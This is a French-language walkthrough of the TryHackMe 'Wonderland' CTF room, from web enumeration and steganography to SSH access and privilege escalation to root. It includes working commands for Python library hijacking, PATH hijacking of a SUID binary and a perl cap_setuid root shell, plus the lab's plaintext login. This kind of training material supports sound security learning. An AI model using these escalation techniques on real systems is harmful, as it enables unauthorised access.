---
title: "TryHackMe - Wonderland"
platform: "TryHackMe"
difficulty: "Medium"
tags: [web, python, ctf, enumeration, privilege escalation, sudo, steganography]
---

## Résumé

Dans ce CTF notre objectif est de récupérer 2 flags (user.txt / root.txt) sur une machine Linux en progressant d'un accès web anonyme jusqu'au compte root à l'aide d'une escalation horizontale sur le thème d'Alice au Pays des Merveilles.

##Outils/Technos Utilisés

Reconnaissance :
- Nmap
- Gobuster

Stéganographie / Accès Initial :
- Steghide
- Wget
- Navigateur web
- SSH

Elévation de privilèges :
-  GTFOBins
-  find
-  sudo
-  getcap
-  Python Library Hijacking
-  PATH Hijacking
-  python3
-  strings
-  file

## Reconnaissance

Après un scan de la machine cible on voit 2 ports ouverts incluant un serveur web à analyser et un shell avec lequel on va pouvoir trouver l'accès initial :

```bash
nmap -sV -T4 <<target>>
Starting Nmap 7.80 ( https://nmap.org ) at <<date>>
Nmap scan report for 10.128.158.150
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploitation initiale

On se rend sur le service web repéré précédemment mais rien de spécial dans le code source ou sur la page web, on lance alors un gobuster à la racine pour trouver de potentiels répertoires cachés :

```bash
gobuster dir -u http://<<target>>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
<<date>> Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
/poem (Status: 301)
===============================================================
<<date>> Finished
===============================================================
```

On voit alors 3 sous-répertoires : /img, /r et /poem.

Après de rapides check-ups on se rend compte que /poem n'apporte aucun indice, que /img contient les images intégrées sur les autres pages web et /r semble être la piste à suivre. On télécharge en local les fichiers des images pour procéder à une stéganographie rapide :

```bash
$ wget http://<<target>>/img/white_rabbit_1.jpg
--<<date>>--  http://target/img/white_rabbit_1.jpg
Resolving target (target)... <<target>>
Connecting to target (target)|<<target>>|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1993438 (1.9M) [image/jpeg]
Saving to: ‘white_rabbit_1.jpg’

white_rabbit_1.jpg                 100%[==============================================================>]   1.90M   878KB/s    in 2.2s    

<<date>> (878 KB/s) - ‘white_rabbit_1.jpg’ saved [1993438/1993438]
```

```bash
$ steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Le fichier white_rabbit_1 contenait un fichier hint.txt qu'on va alors extraire pour voir ce qu'il contient (juste appuyer sur enter car il n'y a pas de passphrase) :

```bash
$ steghide extract -sf white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".
```

```bash
$ cat hint.txt 
follow the r a b b i t
```

Avec cet indice on devine que la suite du CTF se passe dans le sous-répertoire /r/a/b/b/i/t (on peut refaire un gobuster à partir de /r pour s'en assurer).

Une fois sur cette nouvelle page il suffit d'inspecter le code source de la page pour y voir ce qui n'était pas affiché en clair, les credentials de notre porte d'entrée :

```bash
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>Oh, you're sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they're both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

On se connecte donc au port SSH pour vérifier que nos credentials fonctionnent :

```bash
$ ssh alice@<<target>>
Warning: Permanently added the ECDSA host key for IP address '<<target>>' to the list of known hosts.
alice@target's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of <<date>>

  System load:  0.0                Processes:           85
  Usage of /:   19.3% of 19.56GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.63.134
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
```

## Élévation de privilèges

On liste les fichiers de notre répertoire du compte alice et le premier détail c'est qu'il y a un script python ainsi que le flag root.txt pas encore lisible :

```bash
alice@wonderland:~$ ls -la
total 40K
drwxr-xr-x 5 alice alice 4.0K May 25 17:52 .
drwxr-xr-x 6 root  root  4.0K May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25 02:36 .bashrc
drwx------ 2 alice alice 4.0K May 25 16:37 .cache
drwx------ 3 alice alice 4.0K May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3.5K May 25 02:43 walrus_and_the_carpenter.py
alice@wonderland:~$ 
```

Le premier réflexe est d'afficher le contenu du script python, il n'a rien de spécial cependant il importe le module 'random' ce qui est à noter :

```bash
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.
            .....
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""
```

On va alors faire une énumération locale pour voir ce qui est exécutable avec sudo :

```bash
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Bingo, le script python est exécutable en tant que 'rabbit', de plus l'on pourrait utiliser cette librairie 'random' à notre avantage en créant notre propre version de celle-ci localement et ainsi exécuter notre code en tant 'rabbit'.

Premièrement on va vérifier l'ordre de sys.path pour savoir quels sont les répertoires où la librairie 'import' va être recherché dans l'ordre de priorité :

```bash
alice@wonderland:~$ python3.6 -c "import sys; print(sys.path)"
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

Dans cette liste le 1er élément est celui qui passe avant les autres et dans notre cas c'est simplement '', cela indique que lors de l'exécution du script le répertoire courant de celui-ci est vérifié avant tout le reste.

Il suffit donc de créer notre version de cette librairie Python 'import' dans le répertoire d'alice dans le but de pouvoir lancer un bash en tant qu'utilisateur 'rabbit' :

```bash
alice@wonderland:~$ echo 'import os
os.system("/bin/bash")' > random.py
```

On exécute de nouveau le script 'walrus_and_the_carpenter' en tant que rabbit pour accéder à un bash avec son compte :

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland$ whoami
rabbit
```

On va de nouveau regarder les fichiers accessibles à partir du répertoire de notre nouvel utilisateur et s'apercevoir qu'on a un unique fichier nommé 'teaParty' :

```bash
rabbit@wonderland$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40K
drwxr-x--- 2 rabbit rabbit 4.0K May 25 17:58 .
drwxr-xr-x 6 root   root   4.0K May 25 17:52 ..
lrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit  220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit 3.7K May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit  807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root    17K May 25 17:58 teaParty
```

Avant de l'exécuter il faut vérifier son type grâce à la commande 'file' : 

```bash
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

C'est un fichier binaire qui lorsqu'on l'exécute retourne un texte en attendant une réponse, cependant quelle que soit la réponse une erreur 'segmentation fault (core dumped)' est retournée, le nombre de possibilités est donc restreint.

Afin de pouvoir trouver de potentielles exploitations et informations sur ce binaire on décide de le copier sur notre machine locale pour y voir plus clair (nous n'avons pas le mot de passe de rabbit donc on ne peut pas faire simplement une commande 'scp' pour copier le fichier directement).

Sur le shell de 'rabbit' :

```bash
rabbit@wonderland:/home/rabbit$ python3 -m http.server 8000
```

Sur un nouveau shell dans notre machine locale :

```bash
root@ip-<<localIP>>:~# wget http://<<target>>:8000/teaParty
```

Une fois le fichier copié on modifie ses droits pour pouvoir l'exécuter puis on lance la commande 'strings' pour repérer de potentielles failles à exploiter : 

```bash
root@ip-10-128-64-162:~# strings teaParty
/lib64/ld-linux-x86-64.so.2
        ....
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
        ....
```

Sur la ligne "/bin/echo -n 'Probably by ' && date --date='next hour' -R" on peut alors voir que 'date' n'est pas appelé par son chemin absolu (/bin/date) mais par system() ce qui nous donne l'opportunité de faire ce qu'on appelle une injection de commande (PATH hijacking).

On crée le script qui va ouvrir un nouveau shell car l'exécution de ce fichier va se faire avec le bit SUID correspondant (potentiellement celui du dernier utilisateur disponible 'hatter') dans un répertoire accessible en écriture (ici /tmp) :

```bash
rabbit@wonderland:/home/rabbit$ echo '/bin/bash' > /tmp/date
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date
```

Puis on modifie la valeur de la variable d'environnement PATH pour que le script exécute en priorité notre version de date dans le répertoire /tmp : 

```bash
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
```

Enfin on exécute le binaire pour lancer un shell en tant que 'hatter' :

```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:~$ whoami
hatter
```

Comme pour les précédents utilisateurs on va lister les fichiers de notre nouveau répertoire : 

```bash
hatter@wonderland$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -la
total 28K
drwxr-x--- 3 hatter hatter 4.0K May 25 22:56 .
drwxr-xr-x 6 root   root   4.0K May 25 17:52 ..
lrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25 02:58 .bash_logout
-rw-r--r-- 1 hatter hatter 3.7K May 25 02:58 .bashrc
drwxrwxr-x 3 hatter hatter 4.0K May 25 03:42 .local
-rw-r--r-- 1 hatter hatter  807 May 25 02:58 .profile
-rw------- 1 hatter hatter   29 May 25 22:56 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
<<CENSURE>>
```

Dans le seul fichier du répertoire on trouve un mot de passe qui est celui de notre nouvel utilisateur 'hatter' ce qui va nous permettre de nous déconnecter/reconnecter afin d'avoir un shell propre (de plus notre bit SGID était resté celui de 'rabbit' ce qui est problématique pour la suite).

Maintenant plusieurs pistes ont été envisagés avant de trouver la bonne, la première était comme précédemment de vérifier les commandes exécutables avec sudo mais c'est bloqué sur cet utilisateur :

```bash
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter:
Sorry, user hatter may not run sudo on wonderland.
hatter@wonderland:/home/hatter$
```

Alors on prend l'initiative de vérifier les binaires avec 'capabilities' qui sont en général une faille récurrente pour passer root :

```bash
hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:/home/hatter$
```

Les binaires perl et perl5.26.1 ont la capability 'cap_setuid+ep' ce qui signifie que perl peut s'attribuer lui-même l'UID root.

Sur [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) une commande qui exploite cette technique connue est disponible pour lancer un shell en tant que root :

```bash
hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# whoami
root
```

## Flags Trouvés

Le flag root.txt que l'on avait trouvé dans le répertoire /home/alice est maintenant lisible une fois que l'on est root.

Le second flag est caché dans le répertoire root, pour le trouver sans "hasard" on peut exécuter une commande pour le chercher en spécifiant le nom "user.txt" : 

```bash
# find / -iname "user.txt" 2>/dev/null
```

## Conclusion

Je me suis beaucoup amusé sur ce CTF que j'ai trouvé assez complet d'autant plus que c'est mon PREMIER CTF + Write-Up, j'ai notamment pu expérimenter des notions telles que le PATH Hijacking, le Python Library Hijacking et l'exploitation des binaires avec capabilities. J'espère que ce WriteUp va vous aider à comprendre ma démarche et vous éclairer sur le fonctionnement de ces vulnérabilités ! Amusez vous bien :)

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
